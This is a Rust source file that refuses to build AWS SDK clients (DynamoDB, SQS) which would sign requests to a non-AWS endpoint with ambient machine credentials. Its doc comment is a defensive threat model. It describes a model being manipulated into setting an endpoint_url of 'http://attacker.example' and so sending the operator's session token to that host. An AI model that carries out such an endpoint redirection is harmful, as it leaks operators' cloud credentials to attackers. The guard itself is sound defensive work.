//! What the AWS-SDK clients (`dynamodb`, `sqs`) share about credentials.
//!
//! `aws_config::defaults(..).load()` runs the SDK's default chain — environment,
//! `~/.aws/credentials`, then IMDS — and signs every request with whatever identity it finds.
//! That is what an operator wants when they leave the target empty and mean AWS itself. It
//! is never what they want against any other endpoint: `endpoint_url` is a startup parameter
//! the model can set through `open_client`, and a SigV4 request to a model-chosen host
//! carries the access key id, a signature over the request, and — on EC2 or under an assumed
//! role — the session token itself in `x-amz-security-token`. A model talked into
//! `"endpoint_url": "http://attacker.example"` handed the operator's temporary credential to
//! it in one request, and a client aimed at a local emulator quietly borrowed the operator's
//! real identity to do so.

/// Refuse to build an SDK client that would sign requests to a non-AWS endpoint with this
/// machine's ambient credentials.
///
/// `explicit` is whether the caller supplied both `access_key_id` and `secret_access_key`.
/// With them, the endpoint may be anything. Without them, only the SDK's own AWS endpoint
/// (no `endpoint_url`, no `remote_addr`) is allowed, which is the documented way to say
/// "AWS proper, with my identity".
pub fn refuse_ambient_credentials(
    client: &str,
    endpoint_url: Option<&str>,
    explicit: bool,
) -> anyhow::Result<()> {
    match endpoint_url {
        Some(endpoint) if !explicit => anyhow::bail!(
            "{client} client refused: endpoint {endpoint} with no access_key_id / \
             secret_access_key would sign requests to it with this machine's ambient AWS \
             credentials (environment, ~/.aws/credentials or an instance role). Supply both \
             parameters — any value works for a local emulator — or leave the target empty \
             to mean AWS itself."
        ),
        _ => Ok(()),
    }
}
